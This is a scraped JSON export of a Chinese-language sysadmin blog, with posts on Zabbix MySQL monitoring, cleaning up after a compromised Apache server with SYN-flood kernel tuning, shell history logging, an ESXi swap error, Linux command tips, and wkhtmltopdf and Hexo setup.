zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix监控MySQL-添加自定义监控项","slug":"性能监控/Zabbix/zabbix监控MySQL-添加自定义监控项","date":"2014-09-29T11:03:37.000Z","updated":"2017-03-14T06:01:47.000Z","comments":true,"path":"2014/09/29/性能监控/Zabbix/zabbix监控MySQL-添加自定义监控项/","link":"","permalink":"http://blog.yangcvo.me/2014/09/29/性能监控/Zabbix/zabbix监控MySQL-添加自定义监控项/","excerpt":"","text":"zabbix监控MySQL前面一些简单的已在上一篇文章大概讲了zabbix原理和使用安装方法等等。在Zabbix的监控系统中通常是由Zabbix Server与Zabbix Agent一起配合实现监控。在Zabbix Agent内置了很多监控基础的监控项。参见 这些监控项都是CPU, 文件系统, 网络，磁盘等基础的监控项，对于自己开发服务的监控，Zabbix提供了良好框架为用户实现监控和报警，下面将以为MySQL添加监控为例，介绍如何添加自定义监控。 实验环境12MySQL 是分开安装的 ：192.168.1.201zabbix server 端 ：192.168.1.220 角色：Zabbix Agent, Zabbix Server, MySQL, 模板第一步，监控规划在创建监控项之前要尽量考虑清楚要监控什么，怎么监控，监控数据如何存储，监控数据如何展现，如何处理报警等。要进行监控的系统规划需要对Zabbix很了解，这里只是提出监控的需求。 123需求一：监控MySQL的状态，当状态发生异常，发出报警；需求二：监控MySQL的操作，并用图表展现；第二步，使用自定义脚本监控扩展Agent。 Zabbix Server与Agent之间监控数据的采集主要是通过Zabbix Server主动向Agent询问某个Key的值，Agent会根据Key去调用相应的函数去获取这个值并返回给Server端。Zabbix 2.4.7的Agent本并没有内置MySQL的监控功能（但是Server端提供了相应的Template配置），所以我们需要使用Zabbix的User Parameters功能，为MySQL添加监控脚本。 Trapper工作原理:被监控主机根据用户设定的时间间隔定期将数据push到Zabbix Server.这里主要介绍Agent. Agent工作原理: Agent 安装在被监控主机上，定期主动的监控本机的资源和应用,然后将数据进行处理发送给ZabbixServer. Agent工作方式又分为Passive Check 和 Active Check。 Passive Check: Zabbix Server 发起数据索取请求，Agent响应对应的数据. Active Check: Agent首先从Zabbix Server 检索监控项列表,然后定期将对应的数据主动的发送到.Zabbix ServerZabbix Agent 本身预定义了一些监控类型,而对于没有预定义的需要管理员自行定义.因此，Zabbix提供了”UserParameter”参数,以方便用户根据自己的需求自定义想要获取的数据. “UserParameter” 语法:1UserParameter=&lt;key&gt;,&lt;command&gt; 用户自定义一个key; 为命令，该命令用来获取用户想要监控的数据,也就是key的值;定好UserParameter参数后，在为主机或者模板配置监控项的时候，在”key”中输入上面自定义的key的名字就可以了. 假如我要获取Mysql Server的版本，我可以这样定义”UserParameter”:打开 Zabbix Agent安装路径下的 ../etc/zabbix_agentd.conf 配置文件，翻页到最后页面，键入如下行: 1UserParameter=mysql.version,mysql -V 这里我们自定义的key名就是&quot;mysql.version&quot;,命令&quot;mysql -V&quot;用来获取Mysql 版本号,其实就是key对应的值. UserParameter参数实现的原理通俗来讲，就是我们先要熟悉Mysql命令，通过Mysql的命令获取想要的数据，然后赋值给自定义的key，最后通过Zabbix Server获取这个值通过图像等方式展示出来. 下面利用Agent来实现对mysql性能的监控。 agent端：1.利用UserParameter参数自定义Agent Key。对于需求一 ，我们采用mysqladmin这个工具来实现，命令如下： 12[root@mysql ~]# mysqladmin -h 192.168.1.201 -uroot -ppassword pingmysqld is alive 如果MySQL状态正常，会显示mysqld is alive，否则会提示连接不上。对于服务器端，mysqld is alive这样的句子不好理解，服务器端最好只接收1和0，1表示服务可用，0表示服务不可用。那么再改进一下这个命令，如下： 12[root@mysql ~]# mysqladmin -h 192.168.1.201 -uroot -ppassword ping | grep -c alive1 用户名和密码放在命令中对于以后的维护不好，所以我们在/var/lib/zabbix/下创建一个包含MySQL用户名和密码的配置文件“.my.cnf”，如下： 1234[client]user=roothost=192.168.1.201password=xxxx 有了这个文件后的命令变更为 123HOME=/etc mysqladmin ping | grep -c alive[root@mysql ~]# HOME=/var/lib/zabbix/ mysqladmin ping | grep -c alive1 做完这一步后需要做的就是，将这个监控命令添加到Zabbix Agent中，并与一个Key对应，这样Zabbox Server就能通过这个Key获取MySQL的状态了。我们使用mysql.ping作为MySQL状态的Key。 首先在去除/etc/zabbix/zabbix_agentd.conf中 “Include=/etc/zabbix_agentd.conf.d/”这一行的注释符。 其次，在etc/zabbix/zabbix_agentd.conf.d/目录下创建userparameter_mysql.conf文件。在文件中添加如下命令： UserParameter=mysql.ping,HOME=/var/lib/zabbix mysqladmin ping | grep -c alive 这个命令中”UserParameter”表示这是一个用户自定义的脚本；“=”号后是脚本的内容；“mysql.ping”是Key，“，”号后的命令会在Zabbix Server向Agent发起获取“mysql.ping”这个key的请求时被调用，并将返回值返回给Server。保存并退出后可以使用下面的命令测试是否正常工作。 [root@mysql ~]# /usr/sbin/zabbix_agentd -t mysql.ping mysql.ping [t|1] 这里zabbix_agentd使用方法可参考： http://www.ttlsa.com/zabbix/zabbix-command-zabbix_agentd/ 同时，在Server端也可以使用使用zabbix_get命令来测试从Server端获取指定的Client端的数据，如下： 12$ zabbix_get -s 192.168.1.201 -p 10050 -k mysql.ping1 这里如果是跟我一开始有错误的。zabbix 可能跟你安装版本不统一有问题。 这里zabbix_get使用方法可参考: zabbix_agent 我这里参考官网方法： https://www.zabbix.com/documentation/3.0/manual/config/items/userparameters/extending_agent 我在我这里查看MySQL状态zabbix_agentd.conf: 1UserParameter=mysql.questions,mysqladmin -uroot status | cut -f4 -d\":\" | cut -f1 -d\"S\" MySQL机器上面查看是有数据的：[root@mysql scripts]# zabbix_agentd -t mysql.questions mysql.questions [t| 22273707] zabbix server端：[root@LAN_zabbix ~]# /usr/local/zabbix/bin/zabbix_get -s 192.168.1.201 -p10050 -k &apos;mysql.questions&apos; ZBX_NOTSUPPORTED: Unsupported item key. 提示ZBX_NOTSUPPORTED: Unsupported item key. 如果直接查看定义的系统cpu [root@LAN_zabbix ~]# /usr/local/zabbix/bin/zabbix_get -s 192.168.1.201 -p 10050 -k system.cpu.load[all,avg1] 0.350000 这样是有数据的。 所以可以判断上面那个提示ZBX_NOTSUPPORTED: Unsupported item key. 服务端测试可能报各类错误： ZBX_NOTSUPPORTED: Unsupported item key 确认key名字配对了，并且客户端要重启 2.[root@zabbix zabbix]# zabbix_get -s 192.168.9.251 -k mysql.Innodb_log_buffer_sizesh: mysql: command not found加全路径：/mysql/bin/mysql 我试着修改了/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf 这个文件里”HOME=/var/lib/zabbix mysql -N”，把mysql的路径补全，即改为HOME=/etc/zabbix /usr/bin/mysql -N。我是改了这个就可以了 server端： /usr/local/zabbix/bin/zabbix_get -s 192.168.1.201 /usr/bin/mysqladmin -k mysql.questions sh: mysqladmin: 未找到命令 加了绝对路径，我几乎要绝望了。为什么这么坑,后来我看了下，是我seLinux没有关闭。关闭就可以了。 我参考这篇文章操作的：monitoring-mysql-with-zabbix 如果有一下回显，表示工作正常 [root@zabbix ~]# /usr/local/bin/zabbix_get -s 192.168.1.201 -k mysql.status[GlobalStatus,Uptime] 12364726 然后下载安装MySQL监控的模板在我github上面： 导入模版：MySQL监控的模板 并关联到主机 PS：可自行添加对应key可监控项目，模版自带了几种，脚本包括800多项目，然后在添加各自项目的图行： zabbix监控mysql性能通过获取mysql状态值将这些状态值传递给服务器并绘制成图片，这样可以观察mysql的工作情况，通常需要获得状态变量有以下 Com_update：mysql执行的更新个数 Com_select：mysql执行的查询个数 Com_insert：mysql执行插入的个数 Com_delete：执行删除的个数 Com_rollback：执行回滚的操作个数 Bytes_received:接受的字节数 Bytes_sent：发送的字节数 Slow_queries：慢查询语句的个数 查看图像都是有数据： 2)我这里是测试环境用root账号，线上服务器安全期间可以给mysql用户授权readonly权限。 3)根据实际的需求，除了监控上述监控项之外，还可以监控mysql processlist,Innodb等。","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"httpd进程非常多，查找被攻击的原因","slug":"Web服务技术/Apache/httpd进程非常多，查找被攻击的原因","date":"2014-09-13T05:47:27.000Z","updated":"2017-03-14T05:53:54.000Z","comments":true,"path":"2014/09/13/Web服务技术/Apache/httpd进程非常多，查找被攻击的原因/","link":"","permalink":"http://blog.yangcvo.me/2014/09/13/Web服务技术/Apache/httpd进程非常多，查找被攻击的原因/","excerpt":"","text":"前两天，公司托管在电信机房的vps服务器突然网络中断，运营商那边说我们的服务器不断往外发包，严重影响到机房的网络，所以把该机器的端口封了，无比蛋疼啊，无奈下只能亲自跑到机房解决问题。去到机房，使用top命令查看后发现httpd进程居然占到90%多的CPU。 ps -aux |grep httpd |wc -l 发现有300多个httpd进程应该是受到SYN Flood攻击这时候没有直接杀掉进程，要找出是哪个网站受攻击。 top |grep httpd 选取进程中占用CPU%多的，用lsof -p pid 来查看，如果有几个httpd进程都显示同一个网站，则基本上可以判定该网站就是问题网站 lsof -p &lt;pid&gt; 找到问题网站后停掉该网站vps killall -9 httpd ,service httpd start 强制杀掉http进程，再重新启动。 以下是在网上找的预防SYN flood的办法linux下防止SYN Flood攻击，能够有效防范SYN Flood攻击的手段之一，就是SYN Cookie Linux下设置如果你的服务器配置不太好，TCP TIME_WAIT套接字数量达到两、三万，服务器很容易被拖死。通过修改Linux内核参数，可以减少服务器的TIME_WAIT套接字数量。 TIME_WAIT可以通过以下命令查看： 以下是代码片段： netstat -an | grep &quot;TIME_WAIT&quot; | wc -l 在Linux下，如CentOS，可以通过修改/etc/sysctl.conf文件来达到目的增加以下几行： 以下是代码片段： 12345678910net.ipv4.tcp_fin_timeout = 30net.ipv4.tcp_keepalive_time = 1200net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.ip_local_port_range = 1024 65000net.ipv4.tcp_max_syn_backlog = 8192net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2 说明： net.ipv4.tcp_syncookies = 1表示开启SYN Cookies，这是个BOOLEAN。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭；net.ipv4.tcp_tw_reuse = 1 表示开启重用,这是个BOOLEAN。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭；net.ipv4.tcp_tw_recycle = 1表示开启TCP连接中TIME-WAIT sockets的快速回收,这是个BOOLEAN，默认为0，表示关闭。net.ipv4.tcp_fin_timeout = 30 表示如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。单位为秒。net.ipv4.tcp_keepalive_time = 1200表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。单位为秒。net.ipv4.ip_local_port_range = 1024 65000 表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为1024到65000。net.ipv4.tcp_max_syn_backlog = 8192表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。net.ipv4.tcp_max_tw_buckets = 5000 表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数字，TIME_WAIT套接字将立刻被清除并打印警告信息。默认为180000，改为5000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。此项参数可以控制TIME_WAIT套接字的最大数量，避免Squid服务器被大量的TIME_WAIT套接字拖死。net.ipv4.tcp_synack_retries和net.ipv4.tcp_syn_retries是定义SYN重试次数。 执行以下命令使配置生效： 以下是代码片段：/sbin/sysctl -p 如果你不想修改/etc/sysctl.conf，你也可以直接使用命令修改: 以下是代码片段： /sbin/sysctl -w key=value 找漏洞：重新审视了M站目录下文件权限。仅对几个必要的缓存、静态化的目录为apache开启了写权限，防止phzLtoxn.php文件再次生成。 重新开启httpd服务，使用360网站检测对H站进行漏洞检测，发现M站中有严重的远程执行漏洞，于是赶紧打了补丁。 补丁打好之后，顺便修改了系统用户、数据库用户、ftp用户的密码、M站系统用户密码。观察几日之后，一切正常。","raw":null,"content":null,"categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://blog.yangcvo.me/categories/运维安全/"}],"tags":[{"name":"Operation safety","slug":"Operation-safety","permalink":"http://blog.yangcvo.me/tags/Operation-safety/"}]},{"title":"linux系统环境变量优化","slug":"Linux笔记/linux系统环境变量优化","date":"2014-09-07T10:43:45.000Z","updated":"2017-03-14T05:43:07.000Z","comments":true,"path":"2014/09/07/Linux笔记/linux系统环境变量优化/","link":"","permalink":"http://blog.yangcvo.me/2014/09/07/Linux笔记/linux系统环境变量优化/","excerpt":"","text":"linux 系统环境变量优化可以统一写在/etc/profile.d/下面 变化目录结构字体颜色: vim color.sh 1234PS1='[\\[\\033[0;34m\\]\\u\\[\\033[0;37m\\]@\\[\\033[0;35m\\]\\h\\[\\033[0;33m\\] \\w\\[\\033[0;37m\\]]\\[\\033[0;31m\\]\\$\\[\\033[00m\\] 'export PROMPT_COMMAND='&#123; msg=$(history 1 | &#123; read x y; echo $y; &#125;);user=$(whoami); echo $(date \"+%F %H:%M:%S\"):$user:`pwd`/:$msg ---- $(who am i); &#125; &gt;&gt; /tmp/`date \"+%F\"`.`hostname`.`whoami`.history-timestamp'export PROMPT_COMMAND='&#123; msg=$(history 1 | &#123; read x y; echo $y; &#125;);user=$(whoami); echo $(date \"+%F %H:%M:%S\"):$user:`pwd`/:$msg ---- $(who am i); &#125; &gt;&gt; /tmp/`date \"+%F\"`.`hostname`.`whoami`.history-timestamp'export PROMPT_COMMAND='&#123; msg=$(history 1 | &#123; read x y; echo $y; &#125;);user=$(whoami); echo $(date \"+%F %H:%M:%S\"):$user:`pwd`/:$msg ---- $(who am i); &#125; &gt;&gt; /tmp/`date \"+%F\"`.`hostname`.`whoami`.history-timestamp' 设置登录提醒状态: loadaverage.sh 123456unset iunset -f pathmungeecho -e \"\\t\\t\\t\\t\\t\\e[1;31m登录情况\\e[0m\\n\"last -n 6|naliecho -e \"\\n\\t\\t\\t\\t\\t\\e[1;31mcpu负载情况\\e[0m\\n\"uptime 设置历史记录提醒 vim history.sh 1234567export HISTTIMEFORMAT=\"%F %T `whoami`\"USER_IP=`who -u am i 2&gt;/dev/null| awk '&#123;print $NF&#125;'|sed -e 's/[()]//g'`if [ \"$USER_IP\" = \"\" ];thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=\"%F %T $USER_IP:`whoami` \"","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"Exsi报错：Failed to extend swap file from 0 kb to 5242880 kb.","slug":"容器-虚拟化/Vmware Exsi/Exsi报错：Failed to extend swap file from 0 kb to 5242880 kb.","date":"2014-08-19T04:33:03.000Z","updated":"2016-12-17T12:16:50.000Z","comments":true,"path":"2014/08/19/容器-虚拟化/Vmware Exsi/Exsi报错：Failed to extend swap file from 0 kb to 5242880 kb./","link":"","permalink":"http://blog.yangcvo.me/2014/08/19/容器-虚拟化/Vmware Exsi/Exsi报错：Failed to extend swap file from 0 kb to 5242880 kb./","excerpt":"","text":"昨天公司的esxi服务器碰到这么个问题； 问题描述大致 ： 问题出来的过程是这样的， 这个esxi服务器上装了5个虚拟机，有windows，有centos；当我昨天在搭建namenode的构建的过程中，当我同时执行3个任务的时候，虚拟机就挂掉，提示“there is no more space for virtual disk jenkins-00002.vmdk. you might be able to continue this session by freeing dish space on the relevant volume, and clicking _Retry。”然后我在启动jenkins这台服务器的时候，报出异常“Failed to extend swap file from 0 kb to 5242880 kb. ” 第3步：我调小namenode的虚拟机的内存，然后可以进入虚拟机； 出现上述问题之后，我反复的去降低其他虚拟机的配置，吧其他6台虚拟机的内存都降低为1G之后；因为当namenode的服务器挂掉之后，只有降低其他虚拟机的内存，才能登陆进去。 最后发现即使所有的机器的内存都降到最低之后，最后jenkins的机器还是启动不了。报“Failed to extend swap file from 0 kb to xxxx kb. ” 其实我比较不能理解的是，我从其他的机器释放出来的内存上哪去了？ 问题分三种步骤方法： （1）确保有从数据存储足够的空间 1esxi剩余磁盘空间不足，导致，虚拟机启动是，往物理机写swap文件的时候报出了上面的问题； （2） 确保删除任何快照（这占用空间） 12这里我解决方法 删除了一些旧的快照。 就好了。处理方法：我在机器上删掉一个虚拟机，一切恢复正常；并且保证物理机上有足够的内存，作为esxi服务器维护的必备常识； （3）如果所有的失败（尝试编辑您要修改虚拟机的设置） 1在编辑设置窗口，尝试保留内存的VM量设置里面记忆说喜欢16 GB RAM或更少。电源的VM，它应该正常启动！ 虚拟机开机做快照是用内存的，如果关机做快照使用的是硬盘空间。","raw":null,"content":null,"categories":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://blog.yangcvo.me/categories/虚拟化/"}],"tags":[{"name":"Exsi","slug":"Exsi","permalink":"http://blog.yangcvo.me/tags/Exsi/"},{"name":"Vmware","slug":"Vmware","permalink":"http://blog.yangcvo.me/tags/Vmware/"}]},{"title":"Linux实用的一些命令","slug":"Linux笔记/Linux实用的一些命令","date":"2014-07-21T08:12:23.000Z","updated":"2017-03-16T06:18:46.000Z","comments":true,"path":"2014/07/21/Linux笔记/Linux实用的一些命令/","link":"","permalink":"http://blog.yangcvo.me/2014/07/21/Linux笔记/Linux实用的一些命令/","excerpt":"","text":"#学习Linux 实用命令 最近把之前学的慢慢整理出来，很多都是很实用的，而且一时想不起来的，就记录在这里了，不需要去查询资料，这样可以方便下次复习把不经常用的在看一遍。 1. linux 下不解压查看tar.gz包中的文件列表12第一种方法：gunzip &lt;a.tar.gz |tar tvf -第二种方法：gzip -dc a.tar.gz | tar tvf - ###2. cp/rm/mv等命令强制覆盖无需输入yes实现方法 在linux中使用cp/rm/mv命令覆盖文件操作时总是提示输入yes或no，很是麻烦，一两个的也就算了，没什么，但有时会遇到大量文件的复制时，就麻烦了 一、使用unalias cp命令 解除对cp的别名（仅本次终端连接会话临时取消），我们先输入alias命令，查看系统内部已经设置的别名 12345678[root@localhost ~]# alias alias cp='cp -i' alias l.='ls -d .* --color=tty' alias ll='ls -l --color=tty' alias ls='ls --color=tty' alias mv='mv -i' alias rm='rm -i' alias which='alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde' 输入unalias cp命令，取消cp命令的别名 12[root@localhost ~]# unalias cp [root@localhost ~]# cp filename new/filename 使用unalias cp命令后，即可使用cp filename new/filename就不会提示输入yes或no了，是不是很方便 二、直接输入\\cp命令，作用也是取消cp的别名 12[root@localhost ~]# \\cp filename new/filename [root@localhost ~]# 是不是比上一个方法更省事三、使用管道的方式，自动输入yes 123[root@localhost ~]# yes | cp filename new/filename cp: overwrite `new/filename'? [root@localhost ~]#自己替我们输入了yes 3. Linux服务器查看网络丢包 命令：mtr这个之前在学习中有搞过网络方面，一个非常实用的命令就记录下来。mtr 1mtr -n -c 20 -r -i 0.5 公网IP地址 1234567891011[root@LAN_tomcat_A1 ~]# mtr -n -c 20 -r -i 0.5 115.239.210.27HOST: LAN_tomcat_A1 Loss% Snt Last Avg Best Wrst StDev 1. 202.107.202.82 0.0% 20 0.3 0.3 0.2 0.4 0.0 2. 202.107.202.81 0.0% 20 25.0 23.3 3.5 104.8 31.2 3. 61.164.7.120 45.0% 20 4.4 10.5 4.2 35.4 10.4 4. 61.164.31.218 0.0% 20 6.6 6.0 2.9 18.7 3.7 5. ??? 100.0 20 0.0 0.0 0.0 0.0 0.0 6. 115.239.209.30 0.0% 20 4.9 4.9 3.9 5.6 0.3 7. ??? 100.0 20 0.0 0.0 0.0 0.0 0.0 8. ??? 100.0 20 0.0 0.0 0.0 0.0 0.0 9. 115.239.210.27 0.0% 20 4.8 4.4 3.3 5.0 0.5 这里我也对mtr详细讲解下：其中-c的说明是：–report-cycles COUNT 1234567891011121314151617第三列:是显示的每个对应IP的丢包率第四列:显示的最近一次的返回时延第五列:是平均值 这个应该是发送ping包的平均时延第六列:是最好或者说时延最短的第七列:是最差或者说时延最常的第八列:是标准偏差接下来接着说相关参数：mtr -s 用来指定ping数据包的大小mtr -n no-dns不对IP地址做域名解析mtr -a 来设置发送数据包的IP地址 这个对一个主机由多个IP地址是有用的mtr -i 使用这个参数来设置ICMP返回之间的要求默认是1秒mtr -4 IPv4mtr -6 IPv6mtr -h 提供帮助命令mtr -v 显示mtr的版本信息mtr -r 已报告模式显示 4. 查看文件是否有被修改过 命令：stat12345678[root@update]# stat system.sh File: \"system.sh\" Size: 2739 Blocks: 8 IO Block: 4096 普通文件Device: fc02h/64514d Inode: 524302 Links: 1Access: (0755/-rwxr-xr-x) Uid: ( 0/ root) Gid: ( 0/ root)Access: 2016-08-10 17:23:44.946958555 +0800Modify: 2016-05-25 16:58:32.624000645 +0800Change: 2016-05-25 16:58:32.624000645 +0800 5.文件锁定root权限也不能删除文件 命令：chattr1234567891011chattr lsattr+a 只能追加内容+i 不能被修改chattr +i a.txt rm -rf a.txt-bash: a.txt: 权限不够lsattr 命令是查看赋予了什么文件属性。----ia-------e- ./system.sh","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"wkhtmltox源码安装实现HTML页面转成pdf效果","slug":"Linux笔记/wkhtmltox/wkhtmltox源码安装实现HTML页面转成pdf效果","date":"2014-06-24T06:32:56.000Z","updated":"2017-03-14T05:44:20.000Z","comments":true,"path":"2014/06/24/Linux笔记/wkhtmltox/wkhtmltox源码安装实现HTML页面转成pdf效果/","link":"","permalink":"http://blog.yangcvo.me/2014/06/24/Linux笔记/wkhtmltox/wkhtmltox源码安装实现HTML页面转成pdf效果/","excerpt":"","text":"wkhtmltopdf是一个将html页面转成pdf的工具。 wkhtmltox项目主页：http://wkhtmltopdf.org/ 支持html转pdf、image 这段时间公司涉及到将html转成pdf/jpg的相关功能，我查了很多资料，网上大能找到的方法主要有以下两种： 系统环境：系统最好CentOS release 6.5 网上google wkhtmltopdf发现，wkhtmltopdf官网的主机已经迁移到：wkhtmltopdf官网 Ubuntu的源无法更新。wkhtmltopdf有编译好的Linux版本，这里我把链接共享出来：wkhtmltopdf源码中对应的版本，查看打包文件的URL，下载编译好的版本：这里下载源码包最好源码安装，所以直接用编译好的源码就没有报错了。 一开始发现编译安装很多报错，可能需要安装很多依赖,也用RPM安装过，也出现很多问题。好多坑 官网下载 这里官网下载的是外国链接下载会很慢，可以用下面直接服务器wget下载下来。 百度云 #这个是我下载好的可以直接在我百度云下载。也是在官网下载的。 运行命令： 1wget http://download.gna.org/wkhtmltopdf/obsolete/linux/wkhtmltopdf-0.10.0_rc2-static-amd64.tar.bz2 -C /opt/app/ 然后解压缩下载到的文件： 1tar jxvf wkhtmltopdf-0.10.0_rc2-static-amd64.tar.bz2 进行安装,安装完成后将可执行文件复制到 usr/bin 中 1cp /opt/app/wkhtmltopdf-amd64 /usr/bin/wkhtmltopdf-amd64 或者做个软链接： 1ln -s /opt/app/wkhtmltopdf-amd64 /usr/bin/wkhtmltopdf-amd64 更改所有者为root用户,并增加可执行属性 12sudo chown root:root /usr/bin/wkhtmltopdf-amd64sudo chmod +x /usr/bin/wkhtmltopdf-amd64 测试一下，打印一个网页到你自己的指定目录/opt/： 1wkhtmltopdf-amd64 www.qq.com /opt/app/qq.pdf 如果显示成功输出了pdf 那么 wkhtmltopdf 就告安装完成。安装OpenERP8.0 之后，使用打印功能，提示没有wkhtmltopdf，只能以html预览。 在Ubuntu 12.04安装wkhtmltopdf 1sudo apt-get install wkhtmltopdf 提示OpenERP需要至少wkhtmltopdf 0.12.0，检查安装的wkhtmltopdf的版本 1wkhtmltopdf -V 参考链接：wkhtmltopdf官网: wkhtmltopdf官网下载包 wkhtmltopdf源码包： wkhtmltopdf源码下载 mac配置wkhtmltopdf：mac配置wkhtmltopdf php-wkhtmltox-Github:php-wkhtmltox","raw":null,"content":null,"categories":[],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"},{"name":"wkhtmltox","slug":"wkhtmltox","permalink":"http://blog.yangcvo.me/tags/wkhtmltox/"}]},{"title":"hexo常用命令笔记","slug":"Blog/Hexo/hexo常用命令笔记","date":"2014-06-16T14:43:26.000Z","updated":"2017-03-14T05:39:50.000Z","comments":true,"path":"2014/06/16/Blog/Hexo/hexo常用命令笔记/","link":"","permalink":"http://blog.yangcvo.me/2014/06/16/Blog/Hexo/hexo常用命令笔记/","excerpt":"","text":"hexo123npm install hexo -g #安装 npm update hexo -g #升级 hexo init #初始化 简写12345hexo n \"我的博客\" == hexo new \"我的博客\" #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署 服务器命令1234567hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署 监视文件变动123456789101112 hexo generate #使用 Hexo 生成静态文件快速而且简单 hexo generate --watch #监视文件变动``` 完成后部署两个命令的作用是相同的``` bash hexo generate --deploy hexo deploy --generate hexo deploy -g hexo server -g 草稿1hexo publish [layout] &lt;title&gt; 模版12345678hexo new \"postName\" #新建文章hexo new page \"pageName\" #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）hexo deploy #将.deploy目录部署到GitHubhexo new [layout] &lt;title&gt;hexo new photo \"My Gallery\"hexo new \"Hello World\" --lang tw 1234567891011121314 变量 描述layout布局title 标题date 文件建立日期title: 使用Hexo搭建个人博客layout: postdate: 2014-03-03 19:07:43comments: truecategories: Blogtags: [Hexo]keywords: Hexo, Blogdescription: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。模版（Scaffold） 1hexo new photo \"My Gallery\" 123456变量 描述layout 布局title 标题date 文件建立日期设置文章摘要以上是文章摘要 &lt;!--more--&gt; 以下是余下全文 写作12345678910111213141516 hexo new page &lt;title&gt; hexo new post &lt;title&gt;``` 变量 描述 :title 标题 :year 建立的年份（4 位数） :month 建立的月份（2 位数） :i_month 建立的月份（去掉开头的零） :day 建立的日期（2 位数） :i_day 建立的日期（去掉开头的零） ## 推送到服务器上``` bash hexo n #写文章 hexo g #生成 hexo d #部署 #可与hexo g合并为 hexo d -g 报错1.找不到git部署 ERROR Deployer not found: git解决方法 1npm install hexo-deployer-git --save 3.部署类型设置git hexo 3.0 部署类型不再是github，_config.yml 中修改 DeploymentDocs: http://hexo.io/docs/deployment.html1234deploy:type: gitrepository: git@***.github.com:***/***.github.io.gitbranch: master RSS不显示 安装RSS插件 1npm install hexo-generator-feed --save 开启RSS功能编辑hexo/_config.yml，添加如下代码： 1rss: /atom.xml #rss地址 默认即可 Hexo 中如何才可去除底部的 Powered by 信息 ?12345678910111213141516准备工具Hexo一个主题 (我使用的是 Hacker )Editer (我使用的是 VS Code )步骤用文本编辑器打开 Hexo 所在的目录打开 themes 目录打开你想要编辑的主题所在的目录中的 layout 目录打开 layout 目录下的 _partial 目录打开 _partial 目录下的 footer.ejs 文件将下面这段代码修改成你想要的Powered by &lt;a href=\"https://hexo.io/\" target=\"_blank\"&gt;Hexo&lt;/a&gt;Theme by &lt;a href=\"https://github.com/CodeDaraW/Hacker\" target=\"_blank\"&gt;Hacker&lt;/a&gt;Website of &lt;a href=\"https://itdevwu.github.io\" target=\"_blank\"&gt;itdevwu&lt;/a&gt;和平时一样 Save，然后 Deploy查看你的 Hexo 首页，发现已经将“ Powered By ” 改成你想要的了","raw":null,"content":null,"categories":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/categories/Blog/"}],"tags":[{"name":"Blog","slug":"Blog","permalink":"http://blog.yangcvo.me/tags/Blog/"}]},{"title":"hexo打包提示错误:ERROR Plugin load failed:hexo-generator-json-content","slug":"Blog/Hexo/hexo打包提示错误：ERROR Plugin load failed:hexo-generator-json-content","date":"2014-06-16T14:43:26.000Z","updated":"2017-03-22T02:13:51.000Z","comments":true,"path":"2014/06/16/Blog/Hexo/hexo打包提示错误：ERROR Plugin load failed:hexo-generator-json-content/","link":"","permalink":"http://blog.yangcvo.me/2014/06/16/Blog/Hexo/hexo打包提示错误：ERROR Plugin load failed:hexo-generator-json-content/","excerpt":"","text":"hexo打包提示错误:ERROR Plugin load failed:hexo-generator-json-content我操作：npm install -S hexo-generator-json-content 先安装打包代码出错。 这个我已经安装过了，执行：hexo g 就报错。 12345678910111213141516171819202122232425➜ yangcvo.blog git:(master) ✗ hexo gERROR Plugin load failed: hexo-generator-json-contentSyntaxError: Block-scoped declarations (let, const, function, class) not yet supported outside strict mode at Object.exports.runInThisContext (vm.js:53:16) at /Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/hexo/lib/hexo/index.js:227:17 at tryCatcher (/Users/jules/Documents/github-yangc/blog/yangcvo.github.io/node_modules/bluebird/js/release/util.js:16:23) at 